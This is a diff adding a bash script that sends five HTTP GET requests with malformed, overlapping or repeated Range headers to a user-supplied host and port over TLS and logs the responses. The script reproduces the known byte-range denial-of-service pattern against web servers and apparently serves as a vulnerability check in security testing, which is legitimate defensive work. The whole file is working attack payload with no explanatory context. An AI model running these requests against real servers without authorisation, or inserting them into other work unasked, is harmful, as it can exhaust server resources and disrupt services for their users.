@@ -1,0 +1,38 @@
+#!/bin/bash
+
+CMDNAME=`basename $0`
+OUTFILE=$2_httprangedos_$1.txt
+
+if [ $# -ne 2 ]; then
+        echo "Usage: $CMDNAME ip port" 1>&2
+        exit 1
+fi
+
+HEADER1="Accept: text/html, application/xhtml+xml, */*"
+HEADER2="Accept-Language: ja-JP"
+HEADER3="User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+HEADER4="Accept-Encoding: gzip, deflate"
+HEADER5="Connection: close"
+
+echo -e "\r\n\r\n********* HTTP Range Dos 1  ********" > $OUTFILE 2>&1
+echo -e "GET / HTTP/1.1\r\nHost: $1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en-us;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nRange: bytes=-10\r\n\r\n" >> $OUTFILE 2>&1
+echo -e "GET / HTTP/1.1\r\nHost: $1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en-us;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nRange: bytes=-10\r\n\r\n"|openssl s_client -quiet -connect $1:$2 >> $OUTFILE 2>&1
+
+echo -e "\r\n\r\n********* HTTP Range Dos 2  ********" >> $OUTFILE 2>&1
+echo -e "GET / HTTP/1.1\r\nHost: $1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en-us;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nRange: bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7,7-8,8-9,9-10,10-11,11-12,12-13,13-14,14-15,15-16,16-17,17-18,18-19,19-20,20-21,21-22,22-23,23-24,24-25,25-26,26-27,27-28,28-29,29-30,30-31,31-32,32-33\r\n\r\n">> $OUTFILE 2>&1
+echo -e "GET / HTTP/1.1\r\nHost: $1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en-us;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nRange: bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7,7-8,8-9,9-10,10-11,11-12,12-13,13-14,14-15,15-16,16-17,17-18,18-19,19-20,20-21,21-22,22-23,23-24,24-25,25-26,26-27,27-28,28-29,29-30,30-31,31-32,32-33\r\n\r\n"|openssl s_client -quiet -connect $1:$2 >> $OUTFILE 2>&1
+
+echo -e "\r\n\r\n********* HTTP Range Dos 3  ********" >> $OUTFILE 2>&1
+echo -e "GET / HTTP/1.1\r\nHost: $1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en-us;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nRange: bytes=0-\r\n\r\n" >> $OUTFILE 2>&1
+echo -e "GET / HTTP/1.1\r\nHost: $1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en-us;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nRange: bytes=0-\r\n\r\n"|openssl s_client -quiet -connect $1:$2 >> $OUTFILE 2>&1
+
+echo -e "\r\n\r\n********* HTTP Range Dos 4  ********" >> $OUTFILE 2>&1
+echo -e "GET / HTTP/1.1\r\nHost: $1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en-us;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nRange: bytes=1000000-\r\n\r\n">> $OUTFILE 2>&1
+echo -e "GET / HTTP/1.1\r\nHost: $1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en-us;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nRange: bytes=1000000-\r\n\r\n"|openssl s_client -quiet -connect $1:$2 >> $OUTFILE 2>&1
+
+echo -e "\r\n\r\n********* HTTP Range Dos 5  ********" >> $OUTFILE 2>&1
+echo -e "GET / HTTP/1.1\r\nHost: $1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en-us;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nRange: bytes=0-,0-,0-\r\n\r\n">> $OUTFILE 2>&1
+echo -e "GET / HTTP/1.1\r\nhost: $1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en-us;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nRange: bytes=0-,0-,0-\r\n\r\n"|openssl s_client -quiet -connect $1:$2 >> $OUTFILE 2>&1
+
+echo "  **** HTTP check completed. ****"
+exit 0
